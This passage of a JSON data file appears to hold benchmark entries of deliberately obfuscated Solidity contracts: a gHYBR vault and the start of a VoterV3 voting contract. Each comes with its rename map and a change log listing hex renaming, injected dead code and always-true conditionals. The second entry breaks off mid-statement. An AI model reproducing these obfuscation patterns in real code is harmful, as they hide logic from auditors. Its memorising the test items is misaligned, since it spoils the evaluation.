_0xe60a47, address indexed _0x744008);\n    event DefaultVotingStrategyUpdated(address[] _0x1b0e77, uint256[] _0x4f2e65);\n    event AutoVoteExecuted(uint256 _0x072917, address[] _0x1b0e77, uint256[] _0x4f2e65);\n\n    constructor(\n        address _0xaa5f30,\n        address _0x11df40\n    ) ERC20(\"Growth HYBR\", \"gHYBR\") {\n        require(_0xaa5f30 != address(0), \"Invalid HYBR\");\n        require(_0x11df40 != address(0), \"Invalid VE\");\n\n        HYBR = _0xaa5f30;\n        _0xe6284b = _0x11df40;\n        _0x964872 = block.timestamp;\n        _0x609601 = block.timestamp;\n        _0x1b092a = msg.sender; // Initially set deployer as operator\n    }\n\n    function _0xfab177(address _0x7d7d31) external _0x3b9270 {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        require(_0x7d7d31 != address(0), \"Invalid rewards distributor\");\n        _0xd40973 = _0x7d7d31;\n    }\n\n    function _0xb332f8(address _0xdcc297) external _0x3b9270 {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        require(_0xdcc297 != address(0), \"Invalid gauge manager\");\n        _0x7e0b9f = _0xdcc297;\n    }\n\n      /**\n     * @notice Modifier to check authorization (owner or operator)\n     */\n    modifier _0xa79018() {\n        if (msg.sender != _0x1b092a) {\n            revert NOT_AUTHORIZED();\n        }\n        _;\n    }\n    /**\n     * @notice Deposit HYBR and receive gHYBR shares\n     * @param amount Amount of HYBR to deposit\n     * @param recipient Recipient of gHYBR shares\n     */\n    function _0xbff57b(uint256 _0x95fff8, address _0x4c4643) external _0xe17811 {\n        require(_0x95fff8 > 0, \"Zero amount\");\n        _0x4c4643 = _0x4c4643 == address(0) ? msg.sender : _0x4c4643;\n\n        // Transfer HYBR from user first\n        IERC20(HYBR)._0xe79891(msg.sender, address(this), _0x95fff8);\n\n        // Initialize veNFT on first deposit\n        if (_0xa035e7 == 0) {\n            _0x674c35(_0x95fff8);\n        } else {\n            // Add to existing veNFT\n            IERC20(HYBR)._0x5f15b1(_0xe6284b, _0x95fff8);\n            IVotingEscrow(_0xe6284b)._0xe1387f(_0xa035e7, _0x95fff8);\n\n            // Extend lock to maximum duration\n            _0xb66336();\n        }\n\n        // Calculate shares to mint based on current totalAssets\n        uint256 _0x4afad4 = _0x72e4ab(_0x95fff8);\n\n        // Mint gHYBR shares\n        _0x73b707(_0x4c4643, _0x4afad4);\n\n        // Add transfer lock for recipient\n        _0x516e5b(_0x4c4643, _0x4afad4);\n\n        emit Deposit(msg.sender, _0x95fff8, _0x4afad4);\n    }\n\n    /**\n     * @notice Withdraw gHYBR shares and receive a new veNFT with proportional HYBR\n     * @dev Creates new veNFT using multiSplit to maintain proportional ownership\n     * @param shares Amount of gHYBR shares to burn\n     * @return userTokenId The ID of the new veNFT created for the user\n     */\n    function _0xb04c0a(uint256 _0x4afad4) external _0xe17811 returns (uint256 _0x797a10) {\n        require(_0x4afad4 > 0, \"Zero shares\");\n        require(_0x0ced4d(msg.sender) >= _0x4afad4, \"Insufficient balance\");\n        require(_0xa035e7 != 0, \"No veNFT initialized\");\n        require(IVotingEscrow(_0xe6284b)._0xb3ff91(_0xa035e7) == false, \"Cannot withdraw yet\");\n\n        uint256 _0x326abb = HybraTimeLibrary._0x326abb(block.timestamp);\n        uint256 _0x4190f7 = HybraTimeLibrary._0x4190f7(block.timestamp);\n\n        require(block.timestamp >= _0x326abb + _0x8f1f3a && block.timestamp < _0x4190f7 - _0xdc21be, \"Cannot withdraw yet\");\n\n        // Calculate proportional HYBR amount from veNFT\n        uint256 _0x4ff365 = _0x23d1ef(_0x4afad4);\n        require(_0x4ff365 > 0, \"No assets to withdraw\");\n\n        // Calculate fee amount (from the HYBR amount, not shares)\n        uint256 _0xd5867a = 0;\n        if (_0x016abc > 0) {\n            if (1 == 1) { _0xd5867a = (_0x4ff365 * _0x016abc) / BASIS; }\n        }\n\n        // User receives amount minus fee\n        uint256 _0xfb95f2 = _0x4ff365 - _0xd5867a;\n        require(_0xfb95f2 > 0, \"Amount too small after fee\");\n\n        // Get actual HYBR locked amount (not voting power)\n        uint256 _0xa1ddd0 = _0x79fb65();\n        require(_0x4ff365 <= _0xa1ddd0, \"Insufficient veNFT balance\");\n\n        uint256 _0x561872 = _0xa1ddd0 - _0xfb95f2 - _0xd5867a;\n        require(_0x561872 >= 0, \"Cannot withdraw entire veNFT\");\n\n        // Burn gHYBR shares (full amount)\n        _0x100cf9(msg.sender, _0x4afad4);\n\n        // Use multiSplit to create two NFTs: one for user, one for contract\n        uint256[] memory _0x01c08e = new uint256[](3);\n        _0x01c08e[0] = _0x561872; // Amount staying with gHYBR\n        _0x01c08e[1] = _0xfb95f2;      // Amount going to user (after fee)\n        _0x01c08e[2] = _0xd5867a;      // Amount going to fee recipient\n\n        uint256[] memory _0x54ef43 = IVotingEscrow(_0xe6284b)._0x23029e(_0xa035e7, _0x01c08e);\n\n        // Update contract's veTokenId to the first new token\n        if (true) { _0xa035e7 = _0x54ef43[0]; }\n        if (gasleft() > 0) { _0x797a10 = _0x54ef43[1]; }\n        uint256 _0x8aa664 = _0x54ef43[2];\n        // Note: userTokenId is transferred to user, they can manage their own lock time\n        IVotingEscrow(_0xe6284b)._0x4a107f(address(this), msg.sender, _0x797a10);\n        IVotingEscrow(_0xe6284b)._0x4a107f(address(this), Team, _0x8aa664);\n        emit Withdraw(msg.sender, _0x4afad4, _0xfb95f2, _0xd5867a);\n    }\n\n    /**\n     * @notice Internal function to initialize veNFT on first deposit\n     */\n    function _0x674c35(uint256 _0xdeac7b) internal {\n        // Create max lock with the initial deposit amount\n        IERC20(HYBR)._0x5f15b1(_0xe6284b, type(uint256)._0x76c0e0);\n        uint256 _0xb842db = HybraTimeLibrary.MAX_LOCK_DURATION;\n\n        // Create lock with initial amount\n        _0xa035e7 = IVotingEscrow(_0xe6284b)._0x58aa54(_0xdeac7b, _0xb842db, address(this));\n\n    }\n\n    /**\n     * @notice Calculate shares to mint based on deposit amount\n     */\n    function _0x72e4ab(uint256 _0x95fff8) public view returns (uint256) {\n        uint256 _0x29b5d6 = _0xdce3d8();\n        uint256 _0xf89016 = _0x79fb65();\n        if (_0x29b5d6 == 0 || _0xf89016 == 0) {\n            return _0x95fff8;\n        }\n        return (_0x95fff8 * _0x29b5d6) / _0xf89016;\n    }\n\n    /**\n     * @notice Calculate HYBR value of shares\n     */\n    function _0x23d1ef(uint256 _0x4afad4) public view returns (uint256) {\n        uint256 _0x29b5d6 = _0xdce3d8();\n        if (_0x29b5d6 == 0) {\n            return _0x4afad4;\n        }\n        return (_0x4afad4 * _0x79fb65()) / _0x29b5d6;\n    }\n\n    /**\n     * @notice Get total assets (HYBR) locked in veNFT\n     * @dev Returns actual HYBR amount, not voting power\n     */\n    function _0x79fb65() public view returns (uint256) {\n        if (_0xa035e7 == 0) {\n            return 0;\n        }\n        // Get actual locked HYBR amount, not voting power\n        IVotingEscrow.LockedBalance memory _0x2cc432 = IVotingEscrow(_0xe6284b)._0x2cc432(_0xa035e7);\n        return uint256(int256(_0x2cc432._0x95fff8));\n    }\n\n    /**\n     * @notice Add transfer lock for new deposits\n     */\n    function _0x516e5b(address _0x75cc28, uint256 _0x95fff8) internal {\n        uint256 _0xa139bd = block.timestamp + _0xace4db;\n        _0xb1426b[_0x75cc28].push(UserLock({\n            _0x95fff8: _0x95fff8,\n            _0xa139bd: _0xa139bd\n        }));\n        _0x28932d[_0x75cc28] += _0x95fff8;\n    }\n\n    /**\n     * @notice Preview available balance (total - currently locked)\n     * @param user The user address to check\n     * @return available The current available balance for transfer\n     */\n    function _0x1c27c2(address _0x75cc28) external view returns (uint256 _0x8608f3) {\n        uint256 _0xab4ed7 = _0x0ced4d(_0x75cc28);\n        uint256 _0xa4b547 = 0;\n\n        UserLock[] storage _0x2fb392 = _0xb1426b[_0x75cc28];\n        for (uint256 i = 0; i < _0x2fb392.length; i++) {\n            if (_0x2fb392[i]._0xa139bd > block.timestamp) {\n                _0xa4b547 += _0x2fb392[i]._0x95fff8;\n            }\n        }\n\n        return _0xab4ed7 > _0xa4b547 ? _0xab4ed7 - _0xa4b547 : 0;\n    }\n    /**\n     * @notice Clean expired locks and update locked balance\n     * @param user The user address to clean locks for\n     * @return freed The amount of tokens freed from expired locks\n     */\n    function _0xb04d5d(address _0x75cc28) internal returns (uint256 _0x0c2da4) {\n        UserLock[] storage _0x2fb392 = _0xb1426b[_0x75cc28];\n        uint256 _0x626f8c = _0x2fb392.length;\n        if (_0x626f8c == 0) return 0;\n\n        uint256 _0xf6e6e1 = 0;\n        unchecked {\n            for (uint256 i = 0; i < _0x626f8c; i++) {\n                UserLock memory L = _0x2fb392[i];\n                if (L._0xa139bd <= block.timestamp) {\n                    _0x0c2da4 += L._0x95fff8;\n                } else {\n                    if (_0xf6e6e1 != i) _0x2fb392[_0xf6e6e1] = L;\n                    _0xf6e6e1++;\n                }\n            }\n            if (_0x0c2da4 > 0) {\n                _0x28932d[_0x75cc28] -= _0x0c2da4;\n            }\n            while (_0x2fb392.length > _0xf6e6e1) {\n                _0x2fb392.pop();\n            }\n        }\n    }\n\n    /**\n     * @notice Override transfer to implement lock mechanism\n     */\n    function _0xf1f216(\n        address from,\n        address _0xe92fff,\n        uint256 _0x95fff8\n    ) internal override {\n        super._0xf1f216(from, _0xe92fff, _0x95fff8);\n\n        if (from != address(0) && _0xe92fff != address(0)) { // Not mint or burn\n            uint256 _0xab4ed7 = _0x0ced4d(from);\n\n            // Step 1: Check current available balance using cached lockedBalance\n            uint256 _0xa41863 = _0xab4ed7 > _0x28932d[from] ? _0xab4ed7 - _0x28932d[from] : 0;\n\n            // Step 2: If current available >= amount, pass directly\n            if (_0xa41863 >= _0x95fff8) {\n                return;\n            }\n\n            // Step 3: Not enough, clean expired locks and recalculate\n            _0xb04d5d(from);\n            uint256 _0xdc9e31 = _0xab4ed7 > _0x28932d[from] ? _0xab4ed7 - _0x28932d[from] : 0;\n\n            // Step 4: Check final available balance\n            require(_0xdc9e31 >= _0x95fff8, \"Tokens locked\");\n        }\n    }\n\n    /**\n     * @notice Claim all rewards from voting and rebase\n     */\n    function _0xfd116a() external _0xa79018 {\n        require(_0x6e7fb6 != address(0), \"Voter not set\");\n        require(_0xd40973 != address(0), \"Distributor not set\");\n\n        // Claim rebase rewards from RewardsDistributor\n        uint256  _0x6f3a7e = IRewardsDistributor(_0xd40973)._0xa2e653(_0xa035e7);\n        _0x019b41 += _0x6f3a7e;\n        // Claim bribes from voted pools\n        address[] memory _0x740d60 = IVoter(_0x6e7fb6)._0xd4e0af(_0xa035e7);\n\n        for (uint256 i = 0; i < _0x740d60.length; i++) {\n            if (_0x740d60[i] != address(0)) {\n                address _0x4a000a = IGaugeManager(_0x7e0b9f)._0x60c8d5(_0x740d60[i]);\n\n                if (_0x4a000a != address(0)) {\n                    // Prepare arrays for single bribe claim\n                    address[] memory _0xba990e = new address[](1);\n                    address[][] memory _0x2ce469 = new address[][](1);\n\n                    // Claim internal bribe (trading fees)\n                    address _0x15e3b4 = IGaugeManager(_0x7e0b9f)._0xda9929(_0x4a000a);\n                    if (_0x15e3b4 != address(0)) {\n                        uint256 _0x065d33 = IBribe(_0x15e3b4)._0xb71f55();\n                        if (_0x065d33 > 0) {\n                            address[] memory _0x3fd0ea = new address[](_0x065d33);\n                            for (uint256 j = 0; j < _0x065d33; j++) {\n                                _0x3fd0ea[j] = IBribe(_0x15e3b4)._0x3fd0ea(j);\n                            }\n                            _0xba990e[0] = _0x15e3b4;\n                            _0x2ce469[0] = _0x3fd0ea;\n                            // Call claimBribes for this single bribe\n                            IGaugeManager(_0x7e0b9f)._0x929c1b(_0xba990e, _0x2ce469, _0xa035e7);\n                        }\n                    }\n\n                    // Claim external bribe\n                    address _0x40289e = IGaugeManager(_0x7e0b9f)._0x5d340f(_0x4a000a);\n                    if (_0x40289e != address(0)) {\n                        uint256 _0x065d33 = IBribe(_0x40289e)._0xb71f55();\n                        if (_0x065d33 > 0) {\n                            address[] memory _0x3fd0ea = new address[](_0x065d33);\n                            for (uint256 j = 0; j < _0x065d33; j++) {\n                                _0x3fd0ea[j] = IBribe(_0x40289e)._0x3fd0ea(j);\n                            }\n                            _0xba990e[0] = _0x40289e;\n                            _0x2ce469[0] = _0x3fd0ea;\n                            // Call claimBribes for this single bribe\n                            IGaugeManager(_0x7e0b9f)._0x929c1b(_0xba990e, _0x2ce469, _0xa035e7);\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * @notice Execute swap through the configured swapper module\n     * @param _params Swap parameters for the swapper module\n     */\n    function _0x9026c6(ISwapper.SwapParams calldata _0x265102) external _0xe17811 _0xa79018 {\n        require(address(_0x767891) != address(0), \"Swapper not set\");\n\n        // Get token balance before swap\n        uint256 _0x33355c = IERC20(_0x265102._0x1495a0)._0x0ced4d(address(this));\n        require(_0x33355c >= _0x265102._0xf16e13, \"Insufficient token balance\");\n\n        // Approve swapper to spend tokens\n        IERC20(_0x265102._0x1495a0)._0xbaf340(address(_0x767891), _0x265102._0xf16e13);\n\n        // Execute swap through swapper module\n        uint256 _0x11cc1b = _0x767891._0x3f097c(_0x265102);\n\n        // Reset approval for safety\n        IERC20(_0x265102._0x1495a0)._0xbaf340(address(_0x767891), 0);\n\n        // HYBR is now in this contract, ready for compounding\n        _0x5c4df8 += _0x11cc1b;\n    }\n\n    /**\n     * @notice Compound HYBR balance into veNFT (restricted to authorized users)\n     */\n    function _0x6b07c6() external _0xa79018 {\n\n        // Get current HYBR balance\n        uint256 _0x7cfe33 = IERC20(HYBR)._0x0ced4d(address(this));\n\n        if (_0x7cfe33 > 0) {\n            // Lock all HYBR to existing veNFT\n            IERC20(HYBR)._0xbaf340(_0xe6284b, _0x7cfe33);\n            IVotingEscrow(_0xe6284b)._0xe1387f(_0xa035e7, _0x7cfe33);\n\n            // Extend lock to maximum duration\n            _0xb66336();\n\n            if (gasleft() > 0) { _0x609601 = block.timestamp; }\n\n            emit Compound(_0x7cfe33, _0x79fb65());\n        }\n    }\n\n    /**\n     * @notice Vote for gauges using the veNFT\n     * @param _poolVote Array of pools to vote for\n     * @param _weights Array of weights for each pool\n     */\n    function _0x870d85(address[] calldata _0x709c85, uint256[] calldata _0x9bf441) external {\n        require(msg.sender == _0x0b1e1e() || msg.sender == _0x1b092a, \"Not authorized\");\n        require(_0x6e7fb6 != address(0), \"Voter not set\");\n\n        IVoter(_0x6e7fb6)._0x870d85(_0xa035e7, _0x709c85, _0x9bf441);\n        _0xe4f9f1 = HybraTimeLibrary._0x326abb(block.timestamp);\n\n    }\n\n    /**\n     * @notice Reset votes\n     */\n    function _0xe2fbf7() external {\n        require(msg.sender == _0x0b1e1e() || msg.sender == _0x1b092a, \"Not authorized\");\n        require(_0x6e7fb6 != address(0), \"Voter not set\");\n\n        IVoter(_0x6e7fb6)._0xe2fbf7(_0xa035e7);\n    }\n\n    /**\n     * @notice Receive penalty rewards from rHYBR conversions\n     */\n    function _0xc9754f(uint256 _0x95fff8) external {\n\n        // Auto-compound penalty rewards to existing veNFT\n        if (_0x95fff8 > 0) {\n            IERC20(HYBR)._0x5f15b1(_0xe6284b, _0x95fff8);\n\n            if(_0xa035e7 == 0){\n                _0x674c35(_0x95fff8);\n            } else{\n                IVotingEscrow(_0xe6284b)._0xe1387f(_0xa035e7, _0x95fff8);\n\n                // Extend lock to maximum duration\n                _0xb66336();\n            }\n        }\n        _0x267a24 += _0x95fff8;\n        emit PenaltyRewardReceived(_0x95fff8);\n    }\n\n    /**\n     * @notice Set the voter contract\n     */\n    function _0x7f7e31(address _0xc5c572) external _0x3b9270 {\n        require(_0xc5c572 != address(0), \"Invalid voter\");\n        if (block.timestamp > 0) { _0x6e7fb6 = _0xc5c572; }\n        emit VoterSet(_0xc5c572);\n    }\n\n    /**\n     * @notice Update transfer lock period\n     */\n    function _0xb680e1(uint256 _0x3c3fea) external _0x3b9270 {\n        require(_0x3c3fea >= MIN_LOCK_PERIOD && _0x3c3fea <= MAX_LOCK_PERIOD, \"Invalid period\");\n        uint256 _0x28ad5a = _0xace4db;\n        _0xace4db = _0x3c3fea;\n        emit TransferLockPeriodUpdated(_0x28ad5a, _0x3c3fea);\n    }\n\n    /**\n     * @notice Set withdraw fee (in basis points)\n     * @param _fee Fee amount (10-30 basis points)\n     */\n    function _0xa0a086(uint256 _0x32de35) external _0x3b9270 {\n        require(_0x32de35 >= MIN_WITHDRAW_FEE && _0x32de35 <= MAX_WITHDRAW_FEE, \"Invalid fee\");\n        _0x016abc = _0x32de35;\n    }\n\n    function _0xc70e55(uint256 _0x0a4f44) external _0x3b9270 {\n        _0x8f1f3a = _0x0a4f44;\n    }\n\n    function _0x21f010(uint256 _0x0a4f44) external _0x3b9270 {\n        _0xdc21be = _0x0a4f44;\n    }\n\n    /**\n     * @notice Set the swapper module\n     * @param _swapper Address of the swapper module\n     */\n    function _0x441893(address _0xe1f34b) external _0x3b9270 {\n        require(_0xe1f34b != address(0), \"Invalid swapper\");\n        address _0x086ada = address(_0x767891);\n        _0x767891 = ISwapper(_0xe1f34b);\n        emit SwapperUpdated(_0x086ada, _0xe1f34b);\n    }\n\n    /**\n     * @notice Set the team address\n     */\n    function _0x44122d(address _0xc8d606) external _0x3b9270 {\n        require(_0xc8d606 != address(0), \"Invalid team\");\n        if (gasleft() > 0) { Team = _0xc8d606; }\n    }\n\n    /**\n     * @notice Emergency unlock for a user (owner only)\n     */\n    function _0xcaf6b8(address _0x75cc28) external _0xa79018 {\n        delete _0xb1426b[_0x75cc28];\n        _0x28932d[_0x75cc28] = 0;\n        emit EmergencyUnlock(_0x75cc28);\n    }\n\n    /**\n     * @notice Get user's locks info\n     */\n    function _0x94c4d7(address _0x75cc28) external view returns (UserLock[] memory) {\n        return _0xb1426b[_0x75cc28];\n    }\n\n    /**\n     * @notice Set operator address\n     */\n    function _0x98927b(address _0xdb136a) external _0x3b9270 {\n        require(_0xdb136a != address(0), \"Invalid operator\");\n        address _0xe60a47 = _0x1b092a;\n        _0x1b092a = _0xdb136a;\n        emit OperatorUpdated(_0xe60a47, _0xdb136a);\n    }\n\n    /**\n     * @notice Get veNFT lock end time\n     */\n    function _0xde7d63() external view returns (uint256) {\n        if (_0xa035e7 == 0) {\n            return 0;\n        }\n        IVotingEscrow.LockedBalance memory _0x2cc432 = IVotingEscrow(_0xe6284b)._0x2cc432(_0xa035e7);\n        return uint256(_0x2cc432._0xe6fe1d);\n    }\n\n    /**\n     * @notice Internal helper to safely extend lock to maximum duration\n     * @dev Calculates exact duration needed to reach max allowed unlock time\n     */\n    function _0xb66336() internal {\n        if (_0xa035e7 == 0) return;\n\n        IVotingEscrow.LockedBalance memory _0x2cc432 = IVotingEscrow(_0xe6284b)._0x2cc432(_0xa035e7);\n        if (_0x2cc432._0x8fd528 || _0x2cc432._0xe6fe1d <= block.timestamp) return;\n\n        uint256 _0xa233a4 = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\n\n        // Only extend if difference is more than 2 hours\n        if (_0xa233a4 > _0x2cc432._0xe6fe1d + 2 hours) {\n            try IVotingEscrow(_0xe6284b)._0xa0133d(_0xa035e7, HybraTimeLibrary.MAX_LOCK_DURATION) {\n                // Extension successful\n            } catch {\n                // Extension failed, continue without error\n                // This can happen if already at max possible time or other constraints\n            }\n        }\n    }\n\n}",
      "rename_map": {
        "setTailNotWithdrawTime": "_0x21f010",
        "setHeadNotWithdrawTime": "_0xc70e55",
        "head_not_withdraw_time": "_0x8f1f3a",
        "tail_not_withdraw_time": "_0xdc21be",
        "setRewardsDistributor": "_0xfab177",
        "setTransferLockPeriod": "_0xb680e1",
        "_beforeTokenTransfer": "_0xf1f216",
        "receivePenaltyReward": "_0xc9754f",
        "increase_unlock_time": "_0xa0133d",
        "_rewardsDistributor": "_0x7d7d31",
        "rewardsDistributor": "_0xd40973",
        "transferLockPeriod": "_0xace4db",
        "rewardsListLength": "_0xb71f55",
        "safeTransferFrom": "_0x4a107f",
        "_initializeVeNFT": "_0x674c35",
        "_extendLockToMax": "_0xb66336",
        "_addTransferLock": "_0x516e5b",
        "lastCompoundTime": "_0x609601",
        "currentAvailable": "_0xa41863",
        "previewAvailable": "_0x1c27c2",
        "emergencyUnlock": "_0xcaf6b8",
        "create_lock_for": "_0x58aa54",
        "calculateShares": "_0x72e4ab",
        "external_bribes": "_0x5d340f",
        "internal_bribes": "_0xda9929",
        "setGaugeManager": "_0xb332f8",
        "remainingAmount": "_0x561872",
        "calculateAssets": "_0x23d1ef",
        "finalAvailable": "_0xdc9e31",
        "getLockEndTime": "_0xde7d63",
        "sharesReceived": "_0x499ee8",
        "setWithdrawFee": "_0xa0a086",
        "lastRebaseTime": "_0x964872",
        "newTotalLocked": "_0x31e40d",
        "initialAmount": "_0xdeac7b",
        "lockedBalance": "_0x28932d",
        "internalBribe": "_0x15e3b4",
        "currentLocked": "_0xa4b547",
        "_cleanExpired": "_0xb04d5d",
        "_gaugeManager": "_0xdcc297",
        "_votingEscrow": "_0x11df40",
        "lastVoteEpoch": "_0xe4f9f1",
        "maxUnlockTime": "_0xa233a4",
        "externalBribe": "_0x40289e",
        "transferFrom": "_0xe79891",
        "onlyOperator": "_0xa79018",
        "nonReentrant": "_0xe17811",
        "rebaseAmount": "_0x6f3a7e",
        "totalBalance": "_0xab4ed7",
        "claimRewards": "_0xfd116a",
        "_totalAssets": "_0xf89016",
        "getUserLocks": "_0x94c4d7",
        "tokenBalance": "_0x33355c",
        "hybrReceived": "_0x11cc1b",
        "votingEscrow": "_0xe6284b",
        "gaugeManager": "_0x7e0b9f",
        "_totalSupply": "_0x29b5d6",
        "deposit_for": "_0xe1387f",
        "hybrBalance": "_0x7cfe33",
        "userTokenId": "_0x797a10",
        "newTokenIds": "_0x54ef43",
        "safeApprove": "_0xbaf340",
        "executeSwap": "_0x9026c6",
        "isPermanent": "_0x8fd528",
        "votingYield": "_0x5c4df8",
        "withdrawFee": "_0x016abc",
        "totalSupply": "_0xdce3d8",
        "oldOperator": "_0xe60a47",
        "claimBribes": "_0x929c1b",
        "bribeTokens": "_0x3fd0ea",
        "newOperator": "_0x744008",
        "totalAssets": "_0x79fb65",
        "setOperator": "_0x98927b",
        "oldSwapper": "_0x086ada",
        "userAmount": "_0xfb95f2",
        "swapToHYBR": "_0x3f097c",
        "votedPools": "_0x740d60",
        "unlockTime": "_0xa139bd",
        "hybrAmount": "_0x4ff365",
        "newSwapper": "_0x38d3c0",
        "setSwapper": "_0x441893",
        "multiSplit": "_0x23029e",
        "epochStart": "_0x326abb",
        "feeTokenId": "_0x8aa664",
        "tokenCount": "_0x065d33",
        "epochNext": "_0x4190f7",
        "onlyOwner": "_0x3b9270",
        "balanceOf": "_0x0ced4d",
        "oldPeriod": "_0x28ad5a",
        "available": "_0x8608f3",
        "userLocks": "_0xb1426b",
        "newPeriod": "_0x4828e6",
        "_poolVote": "_0x709c85",
        "veTokenId": "_0xa035e7",
        "veBalance": "_0xa1ddd0",
        "recipient": "_0x4c4643",
        "feeAmount": "_0xd5867a",
        "_operator": "_0xdb136a",
        "setVoter": "_0x7f7e31",
        "lockTime": "_0xb842db",
        "_weights": "_0x9bf441",
        "_swapper": "_0xe1f34b",
        "withdraw": "_0xb04c0a",
        "amountIn": "_0xf16e13",
        "operator": "_0x1b092a",
        "compound": "_0x6b07c6",
        "poolVote": "_0xd4e0af",
        "rewards": "_0x836c7c",
        "enabled": "_0x050a7c",
        "weights": "_0x4f2e65",
        "approve": "_0x5f15b1",
        "amounts": "_0x01c08e",
        "_period": "_0x3c3fea",
        "swapper": "_0x767891",
        "deposit": "_0xbff57b",
        "penalty": "_0x267a24",
        "setTeam": "_0x44122d",
        "_params": "_0x265102",
        "tokenIn": "_0x1495a0",
        "rebase": "_0x019b41",
        "tokens": "_0x2ce469",
        "_voter": "_0xc5c572",
        "locked": "_0x2cc432",
        "shares": "_0x4afad4",
        "gauges": "_0x60c8d5",
        "bribes": "_0xba990e",
        "amount": "_0x95fff8",
        "claim": "_0xa2e653",
        "_burn": "_0x100cf9",
        "freed": "_0x0c2da4",
        "voted": "_0xb3ff91",
        "_team": "_0xc8d606",
        "epoch": "_0x072917",
        "voter": "_0x6e7fb6",
        "gauge": "_0x4a000a",
        "pools": "_0x1b0e77",
        "_mint": "_0x73b707",
        "_time": "_0x0a4f44",
        "reset": "_0xe2fbf7",
        "write": "_0xf6e6e1",
        "owner": "_0x0b1e1e",
        "_HYBR": "_0xaa5f30",
        "_fee": "_0x32de35",
        "user": "_0x75cc28",
        "vote": "_0x870d85",
        "fee": "_0x01e553",
        "max": "_0x76c0e0",
        "arr": "_0x2fb392",
        "end": "_0xe6fe1d",
        "len": "_0x626f8c",
        "to": "_0xe92fff"
      },
      "changes": [
        "Renamed 151 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_005",
      "transformed_id": "ss_l4_medium_sn_gs_005",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport './libraries/Math.sol';\nimport './interfaces/IBribe.sol';\nimport './interfaces/IERC20.sol';\nimport './interfaces/IPairInfo.sol';\nimport './interfaces/IPairFactory.sol';\nimport './interfaces/IVotingEscrow.sol';\nimport './interfaces/IGaugeManager.sol';\nimport './interfaces/IPermissionsRegistry.sol';\nimport './interfaces/ITokenHandler.sol';\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol\";\n\ncontract VoterV3 is OwnableUpgradeable, ReentrancyGuardUpgradeable {\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n\n    address public _0xfbbd60;                                         // the ve token that governs these contracts\n    address internal _0x576e20;                                      // $the token\n    address public _0x9d9c4d;                          // registry to check accesses\n    address public _0xce4fcd;\n    uint256 public _0x1db222;\n    uint public EPOCH_DURATION;\n    uint256 internal constant MIN_VOTING_NUM = 10;\n    IGaugeManager public _0x088665;\n\n    mapping(uint256 => mapping(address => uint256)) public _0xf3958f;  // nft      => pool     => votes\n    mapping(uint256 => address[]) public _0x6c24b0;                 // nft      => pools\n\n    mapping(address => uint256) public _0x5fe09b;\n    uint256 public _0x739568;\n    mapping(uint256 => uint256) public _0x059050;\n\n    mapping(uint256 => uint256) public _0x8aaad0;                     // nft      => timestamp of last vote (this is shifted to thursday of that epoc)\n    mapping(uint256 => uint256) public _0x7022b6;            // nft      => timestamp of last vote\n\n    event Voted(address indexed _0x1431b2, uint256 _0xe7db9a, uint256 _0x34aa08);\n    event Abstained(uint256 _0xe7db9a, uint256 _0x34aa08);\n    event SetPermissionRegistry(address indexed _0x007e8e, address indexed _0xa45a07);\n\n    constructor() {}\n\n    // function initialize(address __ve, address _pairFactory, address  _gaugeFactory, address _bribes, address _tokenHandler) initializer public {\n    function _0x0368aa(\n        address __ve,\n        address _0x577ebe,\n        address _0xef561f,\n        address _0x96d500\n    ) public _0xf1dbe6 {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        __Ownable_init();\n        __ReentrancyGuard_init();\n        _0xfbbd60 = __ve;\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x576e20 = IVotingEscrow(__ve)._0xd2941f(); }\n        _0x088665 = IGaugeManager(_0xef561f);\n        _0x9d9c4d = _0x96d500;\n        if (gasleft() > 0) { _0xce4fcd = _0x577ebe; }\n        if (1 == 1) { _0x1db222 = 30; }\n        EPOCH_DURATION = HybraTimeLibrary.WEEK;\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    MODIFIERS\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    modifier VoterAdmin() {\n        require(IPermissionsRegistry(_0x9d9c4d)._0x1e7f0c(\"VOTER_ADMIN\",msg.sender), 'VOTER_ADMIN');\n        _;\n    }\n\n    modifier Governance() {\n        require(IPermissionsRegistry(_0x9d9c4d)._0x1e7f0c(\"GOVERNANCE\",msg.sender), 'GOVERNANCE');\n        _;\n    }\n\n    modifier GenesisManager() {\n        require(IPermissionsRegistry(_0x9d9c4d)._0x1e7f0c(\"GENESIS_MANAGER\", msg.sender), 'GENESIS_MANAGER');\n        _;\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    VoterAdmin\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    /// @notice Set a new PermissionRegistry\n    function _0x55a82a(address _0x96d500) external VoterAdmin {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        require(_0x96d500.code.length > 0, \"CODELEN\");\n        require(_0x96d500 != address(0), \"ZA\");\n        emit SetPermissionRegistry(_0x9d9c4d, _0x96d500);\n        _0x9d9c4d = _0x96d500;\n    }\n\n    function _0x9865e1(uint256 _0x16cb54) external VoterAdmin {\n        require (_0x16cb54 >= MIN_VOTING_NUM, \"LOW_VOTE\");\n        _0x1db222 = 